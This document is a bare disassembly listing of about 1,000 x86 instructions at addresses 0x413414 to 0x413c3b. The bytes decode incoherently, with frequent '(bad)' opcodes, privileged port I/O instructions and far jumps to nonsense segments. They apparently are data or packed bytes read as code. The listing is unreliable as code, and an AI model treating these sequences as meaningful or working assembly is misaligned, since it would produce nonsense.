  413414:	jmp    0x33f6b1a7
  413419:	aaa    
  41341a:	sub    BYTE PTR [eax-0x57081e87],dh
  413420:	sar    BYTE PTR [edi-0xd38f4b7],0xd5
  413427:	cmp    al,0x1e
  413429:	sub    al,0x2
  41342b:	sbb    dl,al
  41342d:	sbb    al,0x4c
  41342f:	pusha  
  413430:	fucomip st,st(5)
  413432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413433:	push   0x3099ddfc
  413438:	inc    esp
  413439:	cld    
  41343a:	and    BYTE PTR [ebp-0x19bf6867],al
  413440:	dec    esp
  413441:	sbb    eax,0xbd6648d4
  413446:	adc    DWORD PTR [eax+0x0],eax
  413449:	mov    al,ds:0x2116bfe2
  41344e:	mov    dh,BYTE PTR [ebp+0x2188d2cf]
  413454:	std    
  413455:	mov    WORD PTR [ecx],gs
  413457:	je     0x41342c
  413459:	mov    bh,0xe7
  41345b:	cmp    dh,al
  41345d:	pop    ebp
  41345e:	xor    cl,BYTE PTR [eax+0x11652751]
  413464:	test   BYTE PTR [eax+0x667a0dd6],cl
  41346a:	test   al,ch
  41346c:	cmp    ebx,DWORD PTR [edx+0x7fb39cd4]
  413472:	sub    ah,cl
  413474:	xor    BYTE PTR [edx],cl
  413476:	in     al,dx
  413477:	frstor [ecx]
  413479:	xchg   DWORD PTR [eax+edx*1],edx
  41347c:	mov    ch,0x7d
  41347e:	ficom  WORD PTR [edi+esi*2]
  413481:	and    ecx,DWORD PTR [ebx]
  413483:	jmp    0x48c7:0x8c52eafa
  41348a:	imul   dh
  41348c:	iret   
  41348d:	mov    dh,0x54
  41348f:	mov    ecx,0xa846ae58
  413494:	out    0x59,eax
  413496:	enter  0xb445,0x9e
  41349a:	(bad)  
  41349b:	loope  0x413427
  41349d:	add    eax,ebx
  41349f:	sbb    dh,ah
  4134a1:	push   esi
  4134a2:	pushf  
  4134a3:	lods   eax,DWORD PTR ds:[esi]
  4134a4:	inc    eax
  4134a5:	xchg   edx,eax
  4134a6:	test   DWORD PTR [ebx-0x58014173],esi
  4134ac:	jne    0x413441
  4134ae:	sbb    ax,0xc594
  4134b2:	cmp    DWORD PTR [eax-0x2dead4e3],eax
  4134b8:	adc    eax,0x760d4372
  4134bd:	(bad)  
  4134be:	push   esp
  4134bf:	pop    DWORD PTR ds:0x9330c662
  4134c5:	or     BYTE PTR [ebx+0x42a66b47],ah
  4134cb:	gs push edi
  4134cd:	add    BYTE PTR [ecx],dh
  4134cf:	fnsave [eax-0x3a]
  4134d2:	leave  
  4134d3:	(bad)  
  4134d4:	xor    bh,BYTE PTR [esi+0x793b4347]
  4134da:	jnp    0x41349f
  4134dc:	pushf  
  4134dd:	ss jns 0x4134e6
  4134e0:	and    al,0xef
  4134e2:	retf   0x3d3b
  4134e5:	ins    DWORD PTR es:[edi],dx
  4134e6:	xchg   ecx,eax
  4134e7:	int    0x6f
  4134e9:	int3   
  4134ea:	addr16 inc ebp
  4134ec:	sbb    edx,eax
  4134ee:	daa    
  4134ef:	xchg   ebp,eax
  4134f0:	ss aaa 
  4134f2:	je     0x41347a
  4134f4:	in     al,0xa3
  4134f6:	mov    eax,0x6bac21d1
  4134fb:	test   eax,0xb9c2860
  413500:	lds    ebp,FWORD PTR [edx-0x9]
  413503:	pushf  
  413504:	cmp    DWORD PTR [ecx-0x39],0x2f1870e0
  41350b:	adc    DWORD PTR [eax+0x41b442e2],esi
  413511:	sahf   
  413512:	int    0xc8
  413514:	push   DWORD PTR [ebx-0x69e58be7]
  41351a:	std    
  41351b:	add    edx,esp
  41351d:	(bad)  
  41351f:	icebp  
  413520:	inc    ecx
  413521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413522:	xchg   ecx,eax
  413523:	mov    al,ds:0xa583237b
  413528:	dec    edx
  413529:	in     al,dx
  41352a:	inc    cx
  41352c:	xchg   DWORD PTR cs:[ecx],ecx
  41352f:	push   es
  413530:	fwait
  413531:	aaa    
  413532:	push   ebp
  413533:	scas   eax,DWORD PTR es:[edi]
  413534:	adc    eax,DWORD PTR [esi+0x4e]
  413537:	and    al,0x15
  413539:	cmp    ch,dh
  41353b:	inc    esi
  41353c:	scas   al,BYTE PTR es:[edi]
  41353d:	int    0x83
  41353f:	arpl   WORD PTR [eax],sp
  413541:	mov    WORD PTR [ebp+0x46],fs
  413544:	push   ebx
  413545:	call   0x58a9:0xa07fcd0e
  41354c:	pusha  
  41354d:	and    DWORD PTR [edx+0x6f883c6e],0xffffffca
  413554:	add    BYTE PTR [ebx],ch
  413556:	rcl    DWORD PTR [eax-0x2325edcb],0x39
  41355d:	ins    DWORD PTR es:[edi],dx
  41355e:	imul   esp,DWORD PTR [esi+0x12e0f697],0xd7865444
  413568:	pusha  
  413569:	in     al,0x1b
  41356b:	pop    ebx
  41356c:	retf   
  41356d:	adc    ch,BYTE PTR [ebx+0x3d494ec3]
  413573:	lahf   
  413574:	mov    eax,0x4afb2791
  413579:	repnz mov edx,0xc840f714
  41357f:	sbb    ah,BYTE PTR [esi-0x42a49680]
  413585:	scas   eax,DWORD PTR es:[edi]
  413586:	mov    eax,ds:0x32cca055
  41358b:	sbb    DWORD PTR [ecx],esi
  41358d:	inc    esi
  41358e:	cmp    ebp,DWORD PTR [eax-0x19]
  413591:	mov    al,0xe4
  413593:	stc    
  413594:	mov    dl,0x18
  413596:	push   esi
  413597:	adc    al,0x6d
  413599:	mov    dh,0xf3
  41359b:	lahf   
  41359c:	sub    BYTE PTR [eax+ebx*4+0x4100953d],al
  4135a3:	test   BYTE PTR [esi],bh
  4135a5:	(bad)  
  4135a6:	call   0x870cbd7a
  4135ab:	pop    ecx
  4135ac:	adc    BYTE PTR [edx-0x1e],0x42
  4135b0:	push   ebp
  4135b1:	sub    eax,esi
  4135b3:	cmp    edi,DWORD PTR [edi*2-0x5c655932]
  4135ba:	mov    ds:0xafdcea9c,eax
  4135bf:	out    0x59,eax
  4135c1:	xchg   ch,al
  4135c3:	mov    bh,0x96
  4135c5:	xchg   esp,eax
  4135c6:	addr16 or edx,0xa1fc8bc9
  4135cd:	or     BYTE PTR [ecx+0x73],dl
  4135d0:	bound  edx,QWORD PTR [ebx-0x5827d7cd]
  4135d6:	push   ss
  4135d7:	pop    eax
  4135d8:	pop    ss
  4135d9:	dec    ebx
  4135da:	lods   eax,DWORD PTR ds:[esi]
  4135db:	or     ch,bl
  4135dd:	mov    cl,0x9
  4135df:	mov    ds:0xd0ad1513,eax
  4135e4:	add    BYTE PTR [edi-0x50],bh
  4135e7:	arpl   WORD PTR [esi],ax
  4135e9:	data16 es mov ah,0xbf
  4135ed:	lds    esp,FWORD PTR [ebx-0x3e013e44]
  4135f3:	or     eax,0x9ab8353e
  4135f8:	or     BYTE PTR [eax+0xe],cl
  4135fb:	inc    esp
  4135fc:	add    DWORD PTR [edx+0x542320e3],ebp
  413602:	push   0x1
  413604:	shr    DWORD PTR [edi+ebp*1+0x14c40c83],cl
  41360b:	cmp    BYTE PTR [esi+0x72f2ee54],dh
  413611:	lock xor eax,0xc4cdf43a
  413617:	sahf   
  413618:	mov    ds:0xb33e3be9,eax
  41361d:	cdq    
  41361e:	and    DWORD PTR [eax],ecx
  413620:	in     al,0x76
  413622:	scas   al,BYTE PTR es:[edi]
  413623:	dec    eax
  413624:	cmc    
  413625:	dec    esi
  413626:	push   esi
  413627:	fwait
  413628:	scas   al,BYTE PTR es:[edi]
  413629:	in     al,dx
  41362a:	and    DWORD PTR [edx+0x12],edi
  41362d:	mov    esi,0x7bd43238
  413632:	or     DWORD PTR [edx],ecx
  413634:	cmp    ebp,0x7096b59b
  41363a:	inc    edx
  41363b:	add    eax,0x390fbecb
  413640:	xchg   ebx,edx
  413642:	jmp    0x6344:0x4d1a86d4
  413649:	jae    0x413612
  41364b:	pop    es
  41364c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41364d:	push   es
  41364e:	mov    ecx,0xf77ce4fc
  413653:	ja     0x4136b2
  413655:	xchg   edx,eax
  413656:	repz fistp DWORD PTR [edx-0x4d9c6193]
  41365d:	sub    eax,DWORD PTR [ebp-0x2e6bb31c]
  413663:	cmp    eax,0x1a1fd994
  413668:	inc    edi
  413669:	push   ebx
  41366a:	mov    ah,0x8b
  41366c:	rcr    ah,cl
  41366e:	aas    
  41366f:	into   
  413670:	inc    esp
  413671:	cmp    BYTE PTR [edi],0x97
  413674:	(bad)  
  413675:	out    dx,eax
  413676:	stos   BYTE PTR es:[edi],al
  413677:	es jbe 0x4136e9
  41367a:	cs mov BYTE PTR fs:[ebx-0x63],cl
  41367f:	scas   eax,DWORD PTR es:[edi]
  413680:	scas   al,BYTE PTR es:[edi]
  413681:	or     al,0x72
  413683:	dec    esp
  413684:	repnz fs shl esp,1
  413688:	xor    al,BYTE PTR [ecx-0x62]
  41368b:	mov    DWORD PTR [ebp+0x3c819830],eax
  413691:	pusha  
  413692:	ins    DWORD PTR es:[edi],dx
  413693:	jg     0x4136d4
  413695:	mov    ds:0xecc77a12,al
  41369a:	push   es
  41369b:	pushf  
  41369c:	sbb    eax,0x96b5e55f
  4136a1:	add    esp,esi
  4136a3:	popf   
  4136a4:	out    dx,al
  4136a5:	add    al,BYTE PTR [edx+ebp*1-0x3]
  4136a9:	fld    QWORD PTR [edx]
  4136ab:	cwde   
  4136ac:	(bad)  
  4136ad:	adc    bl,0x73
  4136b0:	push   esp
  4136b1:	iret   
  4136b2:	ret    0x9d0b
  4136b5:	and    ebx,DWORD PTR [ebx+0x43c5009f]
  4136bb:	pop    eax
  4136bc:	fs test al,0xfe
  4136bf:	xor    edi,DWORD PTR [ecx+edi*2]
  4136c2:	pushf  
  4136c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136c4:	ins    DWORD PTR es:[edi],dx
  4136c5:	sete   BYTE PTR [eax-0x52]
  4136c9:	or     BYTE PTR [ebp+0x5838970d],dh
  4136cf:	ficomp WORD PTR [edx-0x2eb99b89]
  4136d5:	rcl    esi,1
  4136d7:	stc    
  4136d8:	xchg   ebx,eax
  4136d9:	test   al,0x23
  4136db:	lock jle 0x4136c0
  4136de:	into   
  4136df:	cdq    
  4136e0:	mov    eax,0x56dfe384
  4136e5:	test   BYTE PTR [ebp+0x42bb8495],ch
  4136eb:	gs dec ebp
  4136ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136ee:	xchg   DWORD PTR [esi-0x2f],esi
  4136f1:	xlat   BYTE PTR ds:[ebx]
  4136f2:	test   eax,0x489caabf
  4136f7:	add    edx,edx
  4136f9:	iret   
  4136fa:	push   edx
  4136fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136fc:	pop    es
  4136fd:	adc    eax,0x944bb43a
  413702:	hlt    
  413703:	jl     0x4136c9
  413705:	mov    al,0xc3
  413707:	repnz dec edi
  413709:	clts   
  41370b:	mov    sp,0xd0ea
  41370f:	dec    edx
  413710:	inc    esi
  413711:	jecxz  0x41374e
  413713:	ins    DWORD PTR es:[edi],dx
  413714:	pop    edx
  413715:	popa   
  413716:	jo     0x4136b7
  413718:	lahf   
  413719:	sub    DWORD PTR [eax],edi
  41371b:	adc    BYTE PTR [eax-0x34],ch
  41371e:	shr    BYTE PTR [eax-0x5a],cl
  413721:	pop    esi
  413722:	mov    ds:0x14ee311,eax
  413727:	test   BYTE PTR [eax+0x31],dl
  41372a:	mov    esp,0x5f819bad
  41372f:	mov    BYTE PTR [eax-0x41b1b208],ah
  413735:	cmp    al,BYTE PTR [eax]
  413737:	repnz pop edi
  413739:	or     ch,bl
  41373b:	mov    esp,0x296ecc41
  413740:	cwde   
  413741:	cld    
  413742:	adc    BYTE PTR [eax+0x2b155180],ch
  413748:	(bad)  
  41374a:	mov    al,ds:0x466adaa4
  41374f:	mov    eax,ds:0x3f3fa00
  413754:	loope  0x4137ca
  413756:	jmp    FWORD PTR [edx-0xe]
  413759:	xor    cl,BYTE PTR ds:0xe73a4fdf
  41375f:	sub    ecx,DWORD PTR [ebp+0x72]
  413762:	xchg   ch,al
  413764:	mov    ds:0x39703172,al
  413769:	push   ss
  41376a:	adc    BYTE PTR cs:[ebp+0x445d6b4f],cl
  413771:	ret    0xfad7
  413774:	in     eax,0xf5
  413776:	xor    BYTE PTR [ebp-0x68258608],bl
  41377c:	mov    eax,ds:0xeaa24be8
  413781:	int3   
  413782:	pusha  
  413783:	pop    edi
  413784:	push   edi
  413785:	add    al,0x75
  413787:	push   esi
  413788:	push   cs
  413789:	(bad)  
  41378a:	and    eax,0xe1445670
  41378f:	and    eax,DWORD PTR [edx]
  413791:	outs   dx,DWORD PTR ds:[esi]
  413792:	jne    0x413774
  413794:	mov    bl,0x0
  413796:	out    dx,eax
  413797:	add    eax,0x21
  41379a:	and    DWORD PTR [esi+0x622fb194],ebp
  4137a0:	cdq    
  4137a1:	inc    esi
  4137a2:	and    esi,DWORD PTR [edx+ecx*1]
  4137a5:	jl     0x413825
  4137a7:	out    dx,al
  4137a8:	sbb    al,0x22
  4137aa:	jl     0x413739
  4137ac:	rcl    ebx,cl
  4137ae:	adc    BYTE PTR [eax-0x5f],al
  4137b1:	mov    ah,0xb4
  4137b3:	daa    
  4137b4:	int    0xe2
  4137b6:	add    bl,BYTE PTR [esi-0x50c767aa]
  4137bc:	cmp    ebx,DWORD PTR [ebp+0xa63358f]
  4137c2:	xlat   BYTE PTR ds:[ebx]
  4137c3:	enter  0xf6e9,0x8e
  4137c7:	out    0x36,eax
  4137c9:	(bad)
  4137cd:	xor    BYTE PTR ds:0x309a56a,dh
  4137d3:	dec    ebp
  4137d5:	mov    WORD PTR [ebp+0x3c],gs
  4137d8:	fnstsw WORD PTR [esi-0x5c0a64e7]
  4137de:	shl    DWORD PTR [edx-0x1a],0x48
  4137e2:	inc    edx
  4137e3:	sahf   
  4137e4:	push   ebx
  4137e5:	int    0xed
  4137e7:	ja     0x413827
  4137e9:	dec    ebx
  4137ea:	sub    DWORD PTR [eax+0x76a80a77],eax
  4137f0:	sub    esp,ebx
  4137f2:	xor    eax,0x6c3f50b5
  4137f7:	jmp    0x9058:0xcce6e4db
  4137fe:	jg     0x41378e
  413800:	xchg   edi,eax
  413801:	cmp    eax,ecx
  413803:	push   eax
  413804:	dec    ebx
  413805:	mov    al,0xd1
  413807:	test   al,0x2c
  413809:	jb     0x413861
  41380b:	cld    
  41380c:	(bad)  
  41380d:	dec    ebp
  41380e:	or     al,0x53
  413810:	add    ebp,esp
  413812:	mov    esi,0x16e9eca5
  413817:	cmp    BYTE PTR [edx-0x2e2238ca],bh
  41381d:	mov    al,ds:0xe5148fdc
  413822:	pop    ebp
  413823:	not    DWORD PTR [edx-0x4c]
  413826:	and    al,0x97
  413828:	push   es
  413829:	jb     0x4137b1
  41382b:	cmp    ebp,DWORD PTR [edi+ebx*8]
  41382e:	mov    bl,0x61
  413830:	dec    edi
  413831:	push   0xffffffe0
  413833:	push   eax
  413834:	mov    bl,0x11
  413836:	hlt    
  413837:	fmul   DWORD PTR [eax]
  413839:	and    eax,0x8871a33b
  41383e:	adc    eax,0xa4359e64
  413843:	inc    eax
  413844:	jbe    0x4138ba
  413846:	popa   
  413847:	sub    BYTE PTR [ecx],al
  413849:	jno    0x41382d
  41384b:	xchg   BYTE PTR [ebx+0x27],ah
  41384e:	(bad)  
  41384f:	loope  0x413875
  413851:	addr16 jmp 0x54ffc0cc
  413857:	rol    bl,1
  413859:	adc    BYTE PTR [esi+0x5],ah
  41385c:	cwde   
  41385d:	icebp  
  41385e:	fldenv [eax+0x245d4ac]
  413864:	jnp    0x4138de
  413866:	mov    BYTE PTR [eax*8+0x16ce7e6a],dl
  41386d:	and    eax,0x6992c571
  413872:	repz sub ecx,DWORD PTR [ebx-0x53f9d026]
  413879:	mov    eax,ds:0xfef939bb
  41387e:	pop    ebx
  41387f:	mov    cl,0x52
  413881:	call   0xac5d3e7d
  413886:	push   ds
  413887:	sub    BYTE PTR [esi],0xfe
  41388a:	cs push eax
  41388c:	cdq    
  41388d:	loopne 0x41390c
  41388f:	mov    al,ds:0x7499d5b1
  413894:	fild   QWORD PTR ds:0xfff912
  41389a:	lds    eax,FWORD PTR [edi]
  41389c:	iret   
  41389d:	jno    0x41388c
  41389f:	ret    0xc24d
  4138a2:	inc    edx
  4138a3:	cmc    
  4138a4:	retf   0xaa64
  4138a7:	push   esp
  4138a8:	jmp    0x413849
  4138aa:	fwait
  4138ab:	sti    
  4138ac:	xchg   esi,eax
  4138ad:	add    BYTE PTR [ebp-0x2d],ch
  4138b0:	mov    esp,0xa5d2a6ba
  4138b5:	loope  0x413923
  4138b7:	pop    ebp
  4138b8:	ret    
  4138b9:	jp     0x413842
  4138bb:	dec    esp
  4138bc:	lods   al,BYTE PTR ds:[esi]
  4138bd:	xchg   edx,eax
  4138be:	repnz mov bh,0x49
  4138c1:	(bad)  
  4138c2:	mov    edx,0x7663b811
  4138c7:	retf   
  4138c8:	sbb    ebx,DWORD PTR [eax-0x3603e6b0]
  4138ce:	push   ds
  4138cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d0:	cmp    ecx,esp
  4138d2:	or     ebp,DWORD PTR ds:0x16683933
  4138d8:	test   al,0x3a
  4138da:	das    
  4138db:	scas   al,BYTE PTR es:[edi]
  4138dc:	mov    BYTE PTR [edx],ch
  4138de:	loop   0x413890
  4138e0:	jle    0x4138b0
  4138e2:	(bad)  
  4138e3:	popa   
  4138e4:	call   DWORD PTR [edx-0x26460a36]
  4138ea:	cmc    
  4138eb:	xor    al,0x1c
  4138ed:	in     al,0x70
  4138ef:	mov    ecx,0x7faea14e
  4138f4:	pop    ebp
  4138f5:	cld    
  4138f6:	daa    
  4138f7:	or     esi,ecx
  4138f9:	retf   0x951a
  4138fc:	aaa    
  4138fd:	jo     0x4138cc
  4138ff:	ja     0x413892
  413901:	mov    ebx,0xd4a9a670
  413906:	and    al,0x79
  413908:	test   eax,0x20b199a3
  41390d:	push   0x99b78c18
  413912:	shl    DWORD PTR [ebx-0x7a5e3bae],cl
  413918:	push   ebp
  413919:	ficomp WORD PTR [edx+edx*8+0x60]
  41391d:	lds    ebp,FWORD PTR [edx]
  41391f:	ins    BYTE PTR es:[edi],dx
  413920:	mov    al,ds:0x87b7b591
  413925:	test   al,0x70
  413927:	jbe    0x4138b4
  413929:	sti    
  41392a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41392b:	or     DWORD PTR [edi+0x12396732],ecx
  413931:	repz into 
  413933:	sub    eax,0xd963be97
  413938:	popa   
  413939:	enter  0xbb26,0x2b
  41393d:	dec    edi
  41393e:	dec    edx
  41393f:	pop    es
  413940:	faddp  st(5),st
  413942:	jg     0x413945
  413944:	or     BYTE PTR [edx+eiz*1-0x14],bl
  413948:	shr    ebp,cl
  41394a:	sub    al,0x33
  41394c:	imul   edx,DWORD PTR [edi+0x2],0x73
  413950:	std    
  413951:	icebp  
  413952:	push   ecx
  413953:	inc    edi
  413954:	mov    ?,WORD PTR [esp+eiz*8+0x22c5a363]
  41395b:	mov    edi,0xc879b335
  413960:	mov    edi,DWORD PTR [eax]
  413962:	xchg   esp,ebx
  413964:	mov    cs,WORD PTR ds:0x7267fd3f
  41396a:	neg    BYTE PTR [edx-0x26]
  41396d:	cmp    BYTE PTR [esi+0x70c97daa],0xb3
  413974:	xchg   dh,bh
  413976:	rcr    DWORD PTR [ecx],0x93
  413979:	sbb    BYTE PTR [esi-0xdfc6c7],dl
  41397f:	nop
  413980:	iret   
  413981:	sahf   
  413982:	outs   dx,DWORD PTR cs:[esi]
  413984:	fisubr WORD PTR [ebx+0x53]
  413987:	add    ah,0x99
  41398a:	ss or  ebx,esp
  41398d:	sahf   
  41398e:	push   0xbb415e21
  413993:	dec    edi
  413994:	xchg   esp,eax
  413995:	call   0xc0fd:0x652e9f55
  41399c:	mov    eax,ds:0xb38ebc00
  4139a1:	jp     0x4139ff
  4139a3:	and    eax,0x6a93db35
  4139a8:	int3   
  4139a9:	xor    BYTE PTR [esi+0x364b970e],bh
  4139af:	ss movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4139b2:	inc    edx
  4139b3:	mov    ds:0x8af4ddf7,al
  4139b8:	(bad)  
  4139b9:	pushf  
  4139ba:	jl     0x413a1b
  4139bc:	push   cs
  4139bd:	xchg   esi,eax
  4139be:	mov    al,ds:0xe9143028
  4139c3:	mov    esi,0x98a4eb17
  4139c8:	jecxz  0x413a18
  4139ca:	call   0xa6421a90
  4139cf:	mov    edi,0x3f515919
  4139d4:	push   0x816f6852
  4139d9:	outs   dx,DWORD PTR ds:[esi]
  4139da:	lds    edx,FWORD PTR ds:0x2eee3cbc
  4139e0:	xor    BYTE PTR [edi-0x7819926e],ah
  4139e6:	sti    
  4139e7:	std    
  4139e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139e9:	mov    DWORD PTR [ecx-0xb],esp
  4139ec:	out    0xf7,eax
  4139ee:	mov    al,ds:0x50ef47da
  4139f3:	dec    esi
  4139f4:	es hlt 
  4139f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f8:	pop    esi
  4139f9:	fmul   st(2),st
  4139fb:	xchg   ebp,eax
  4139fc:	js     0x413a3d
  4139fe:	jge    0x4139ec
  413a00:	xchg   BYTE PTR cs:[ecx-0x232f5ab0],ah
  413a07:	mov    bh,dh
  413a09:	test   DWORD PTR [ebp+0x3f],edx
  413a0c:	xchg   BYTE PTR [esi+0x7a],dh
  413a0f:	sub    bh,BYTE PTR ds:0x96e28a05
  413a15:	xlat   BYTE PTR ds:[ebx]
  413a16:	nop
  413a17:	test   BYTE PTR [ebx+0x2e],bl
  413a1a:	pop    es
  413a1b:	mov    eax,ds:0x606ef363
  413a20:	mov    esi,0x57b9a580
  413a25:	jecxz  0x413a7b
  413a27:	mov    ecx,0xf77f8724
  413a2c:	sti    
  413a2d:	xchg   edi,eax
  413a2e:	jl     0x413a8e
  413a30:	out    dx,eax
  413a31:	adc    al,0x16
  413a33:	mov    ds:0x2dc51fed,eax
  413a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a39:	iret   
  413a3a:	sbb    BYTE PTR [eax],0x87
  413a3d:	aam    0x71
  413a3f:	das    
  413a40:	sub    esp,DWORD PTR [ebx+edx*1+0x31dd6c41]
  413a47:	sbb    edx,DWORD PTR [edx+eax*2]
  413a4a:	mov    ebp,0xbdcca575
  413a4f:	retf   0xcd65
  413a52:	cmp    eax,DWORD PTR [esi+edi*4]
  413a55:	ins    BYTE PTR es:[edi],dx
  413a56:	mov    ecx,0x441bf565
  413a5b:	xor    BYTE PTR [edi+0x1ffceea4],bl
  413a61:	shr    DWORD PTR [ecx+0x716d6599],cl
  413a67:	or     eax,0x3261df91
  413a6c:	call   FWORD PTR [ebx-0x5a5b6450]
  413a72:	pop    esi
  413a73:	in     al,dx
  413a74:	ss cld 
  413a76:	mov    DWORD PTR ds:0xb4815f5a,ebx
  413a7c:	dec    esp
  413a7d:	dec    esp
  413a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a7f:	sbb    esi,esi
  413a81:	add    DWORD PTR [edx],ebx
  413a83:	sbb    eax,0x23582b7c
  413a88:	pop    esp
  413a89:	mov    ch,0xba
  413a8b:	dec    esp
  413a8c:	fiadd  DWORD PTR [ecx-0x5c3da383]
  413a92:	rol    DWORD PTR [ebx],cl
  413a94:	in     al,0xcc
  413a96:	mov    esp,0xb647ae02
  413a9b:	inc    edi
  413a9c:	dec    edi
  413a9d:	pop    eax
  413a9e:	ret    
  413a9f:	repnz mov ds:0xca45eabc,eax
  413aa5:	xchg   esp,eax
  413aa6:	loop   0x413b12
  413aa8:	sub    DWORD PTR [edi],0xede9594b
  413aae:	iret   
  413aaf:	test   al,0xf8
  413ab1:	fisubr WORD PTR [ebx-0x7a1422dc]
  413ab7:	pop    edx
  413ab8:	int3   
  413ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aba:	lock sbb ebp,DWORD PTR [edi-0x55d31ce8]
  413ac1:	ja     0x413a85
  413ac3:	pop    eax
  413ac4:	dec    eax
  413ac5:	sub    bl,BYTE PTR [ebp+0x36]
  413ac8:	mov    al,0xaa
  413aca:	mov    edi,esp
  413acc:	xchg   ebx,eax
  413acd:	sbb    eax,0x56cbc18e
  413ad2:	inc    esp
  413ad3:	in     al,0x80
  413ad5:	add    DWORD PTR ds:0xee846566,edx
  413adb:	inc    eax
  413adc:	push   edi
  413add:	mov    ds:0x3f60987,eax
  413ae2:	pusha  
  413ae3:	mov    cl,0x40
  413ae5:	enter  0x24ce,0x84
  413ae9:	sub    eax,0xaecbf143
  413aee:	push   cs
  413aef:	adc    edi,esp
  413af1:	jp     0x413b22
  413af3:	pop    edx
  413af4:	dec    esp
  413af5:	pop    esp
  413af6:	adc    eax,0xf1d2c5a4
  413afb:	mov    edx,0x92e9f908
  413b00:	mov    al,ds:0x31c10063
  413b05:	test   BYTE PTR [esi+0x2331d1a5],dh
  413b0b:	jmp    0x413b3b
  413b0d:	jbe    0x413b69
  413b0f:	dec    edx
  413b10:	pushf  
  413b11:	push   ss
  413b12:	push   ecx
  413b13:	ror    BYTE PTR [ebx],cl
  413b15:	mov    BYTE PTR [esi+esi*2-0x3a],bl
  413b19:	shl    BYTE PTR [eax+0x3c],0xf2
  413b1d:	call   0x89a3ebf4
  413b22:	into   
  413b23:	jg     0x413afc
  413b25:	js     0x413ab5
  413b27:	jno    0x413b0a
  413b29:	popa   
  413b2a:	push   esi
  413b2b:	fnclex 
  413b2d:	imul   edx,DWORD PTR [eax-0x30],0xc363d2ca
  413b34:	mov    bh,0x4c
  413b36:	inc    esp
  413b37:	call   0x683a3cb0
  413b3c:	jl     0x413bb0
  413b3e:	xchg   esi,eax
  413b3f:	jp     0x413b97
  413b41:	add    eax,0x6cf570ad
  413b46:	fcmove st,st(2)
  413b48:	js     0x413b6c
  413b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b4b:	jle    0x413b0d
  413b4d:	pop    es
  413b4e:	out    dx,eax
  413b4f:	test   esi,ebx
  413b51:	cmp    al,0x93
  413b53:	dec    eax
  413b54:	test   DWORD PTR [edx+0x74],esp
  413b57:	fucomi st,st(5)
  413b59:	mov    ch,0x2f
  413b5b:	cld    
  413b5c:	mov    esp,0x84bd4c0d
  413b61:	(bad)  
  413b62:	pop    ecx
  413b63:	imul   esi,DWORD PTR [esp+eax*1-0x34],0x567bc220
  413b6b:	out    0x9b,eax
  413b6d:	mov    WORD PTR [edx],fs
  413b6f:	jne    0x413b1d
  413b71:	loop   0x413b58
  413b73:	and    al,0xd2
  413b75:	inc    ebx
  413b76:	stos   DWORD PTR es:[edi],eax
  413b77:	lahf   
  413b78:	xor    edi,DWORD PTR [edi]
  413b7a:	out    dx,al
  413b7b:	jl     0x413bf3
  413b7d:	xor    dh,al
  413b7f:	cmp    BYTE PTR [eax-0x4],0x80
  413b83:	jae    0x413bc3
  413b85:	js     0x413b08
  413b87:	bound  esi,QWORD PTR [ebp-0x245cb401]
  413b8d:	dec    ecx
  413b8e:	mov    ecx,0xd674bc34
  413b93:	jl     0x413b65
  413b95:	cli    
  413b96:	test   ch,al
  413b98:	mov    ch,BYTE PTR [eax+0x6da8ab78]
  413b9e:	add    BYTE PTR [ebp+0x73],dh
  413ba1:	add    al,0xf6
  413ba3:	jmp    0x51fc4d03
  413ba8:	jno    0x413bd9
  413baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bab:	fs (bad) 
  413bad:	idiv   DWORD PTR [edx]
  413baf:	inc    edx
  413bb0:	(bad)  
  413bb1:	int    0xa7
  413bb3:	lods   eax,DWORD PTR ds:[esi]
  413bb4:	push   cs
  413bb5:	push   ebx
  413bb6:	nop
  413bb7:	js     0x413b3f
  413bb9:	lea    ebx,[edx+ebp*8-0x4a]
  413bbd:	retf   
  413bbe:	das    
  413bbf:	xor    ah,BYTE PTR [edi-0x1a659220]
  413bc5:	mov    esi,0x2440e98e
  413bca:	sub    al,0x7
  413bcc:	jge    0x413c1f
  413bce:	data16 xor BYTE PTR [eax-0x5c],al
  413bd2:	rol    DWORD PTR [ebx],cl
  413bd4:	arpl   dx,si
  413bd6:	xchg   ebx,eax
  413bd7:	daa    
  413bd8:	push   cs
  413bd9:	xchg   ebx,eax
  413bda:	sbb    eax,edi
  413bdc:	or     esi,0x93f770ce
  413be2:	test   DWORD PTR [edx+0x579af48f],eax
  413be8:	(bad)  [esi]
  413bea:	aam    0x81
  413bec:	test   DWORD PTR [esi+0x27],0xf1cb1e1
  413bf3:	jae    0x413c09
  413bf5:	and    eax,0xaea46376
  413bfa:	dec    ebx
  413bfb:	pushf  
  413bfc:	cli    
  413bfd:	mov    ch,ah
  413bff:	xor    ch,dl
  413c01:	jl     0x413b93
  413c03:	xor    eax,0x7690f540
  413c08:	add    BYTE PTR [eax],bl
  413c0a:	mov    ebp,0xe4136a54
  413c0f:	adc    al,0x3e
  413c11:	push   0xd3c119d6
  413c16:	div    DWORD PTR [esi+eiz*1]
  413c19:	inc    ecx
  413c1a:	sbb    eax,0xdb653513
  413c1f:	xchg   edi,eax
  413c20:	xchg   ecx,eax
  413c21:	pop    edi
  413c22:	enter  0xcf5d,0x89
  413c26:	mov    DWORD PTR [ebp-0x4e],ebx
  413c29:	mov    dh,0xd5
  413c2b:	imul   ebp,DWORD PTR [ebx],0xbc912740
  413c31:	arpl   WORD PTR ds:0x35a27623,di
  413c37:	into   
  413c38:	pop    ebx
  413c39:	in     al,0xff
  413c3b:	ret    0xeee7
